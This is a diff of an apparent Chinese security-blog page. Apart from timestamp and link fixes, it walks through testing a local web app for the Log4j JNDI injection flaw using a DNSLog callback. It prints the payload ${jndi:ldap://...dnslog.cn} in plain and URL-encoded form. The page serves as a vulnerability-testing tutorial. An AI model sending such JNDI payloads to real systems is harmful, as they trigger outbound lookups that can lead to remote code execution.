@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://blog.pppfz.com/assets/117350f11a80fb9df3992f43bb78971f.png">
 <meta property="og:image" content="https://blog.pppfz.com/assets/a096ba03a94522ae0444a2d38d5d5051.png">
 <meta property="article:published_time" content="2023-08-16T08:04:43.000Z">
-<meta property="article:modified_time" content="2023-08-16T13:49:33.527Z">
+<meta property="article:modified_time" content="2023-09-25T11:57:01.010Z">
 <meta property="article:author" content="PPPFZ">
 <meta property="article:tag" content="漏洞">
 <meta name="twitter:card" content="summary">
@@ -361,8 +361,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-08-16 21:49:33</span>
-            <span class="mobile">2023-08-16 21:49:33</span>
+            <span class="desktop">2023-09-25 19:57:01</span>
+            <span class="mobile">2023-09-25 19:57:01</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -495,14 +495,14 @@
                      data-src="https://blog.pppfz.com/assets/117350f11a80fb9df3992f43bb78971f.png"
                       alt="117350f11a80fb9df3992f43bb78971f.png"
                 ></p>
-<h3 id="3-使用DNSLog进行测试"><a href="#3-使用DNSLog进行测试" class="headerlink" title="3.使用DNSLog进行测试"></a>3.使用DNSLog进行测试</h3><p>(1)前往<a class="link"   target="_blank" rel="noopener" href="http://www.dnslog.cn,申请子域名进行测试/" >http://www.dnslog.cn,申请子域名进行测试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="3-使用DNSLog进行测试"><a href="#3-使用DNSLog进行测试" class="headerlink" title="3.使用DNSLog进行测试"></a>3.使用DNSLog进行测试</h3><p>(1)前往 <a class="link"   target="_blank" rel="noopener" href="http://www.dnslog.cn/" >http://www.dnslog.cn <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ,申请子域名进行测试</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://blog.pppfz.com/assets/a096ba03a94522ae0444a2d38d5d5051.png"
                       alt="a096ba03a94522ae0444a2d38d5d5051.png"
                 ></p>
-<p>(2)在web主页面中点击 ???，url地址变为<a class="link"   target="_blank" rel="noopener" href="http://localhost:8080/hello?payloada=111,%E6%9B%B4%E6%94%B9payload%E4%B8%BA$%7Bjndi:ldap:/test.f2l309.dnslog.cn%7D%EF%BC%8C%E5%B9%B6%E5%B0%86payloadi%E8%BF%9B%E8%A1%8Curl%E7%BC%96%E7%A0%81%E3%80%82" >http://localhost:8080/hello?payloada=111,更改payload为${jndi:ldap:/test.f2l309.dnslog.cn}，并将payloadi进行url编码。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>(2)在web主页面中点击 ???，url地址变为 <a class="link"   target="_blank" rel="noopener" href="http://localhost:8080/hello?payloada=111" >http://localhost:8080/hello?payloada=111 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ,更改payload为${jndi:ldap:&#x2F;test.f2l309.dnslog.cn}，并将payloadi进行url编码。</p>
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/hello?payload=$&#123;jndi:ldap://test.cohgfw.dnslog.cn&#125;</span><br><span class="line"></span><br><span class="line">http://127.0.0.1:8080/hello?payload=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%74%65%73%74%2e%63%6f%68%67%66%77%2e%64%6e%73%6c%6f%67%2e%63%6e%7d</span><br></pre></td></tr></table></figure></div>
 
 <p>访问成功后，查看DNSLog的DNS查询记录，出现payload中的字段说明测试成功。</p>
@@ -524,7 +524,7 @@
         <li><strong>创建于:</strong> 2023-08-16 16:04:43</li>
         
             <li>
-                <strong>更新于:</strong> 2023-08-16 21:49:33
+                <strong>更新于:</strong> 2023-09-25 19:57:01
             </li>
         
         <li>
